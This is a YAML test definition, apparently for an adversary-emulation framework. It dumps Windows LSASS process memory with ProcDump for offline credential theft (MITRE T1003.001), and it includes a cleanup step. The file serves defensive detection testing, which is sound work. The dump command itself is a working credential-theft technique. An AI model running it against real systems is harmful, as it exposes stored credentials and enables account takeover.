api_version: "2.0"
name: Dump LSASS.exe Memory using ProcDump
description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump.

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
args:
    - name: output_file
      type: path
      default: C:\Windows\Temp\lsass_dump.dmp
    - name: procdump_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe
uuid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: dump-lsass.exe-memory-using-procdump
      inline: |
        "{{.Args.procdump_exe}}" -accepteula -ma lsass.exe {{.Args.output_file}}
      executor: command_prompt
      cleanup:
        inline: |
            del "{{.Args.output_file}}" >nul 2> nul
        executor: command_prompt
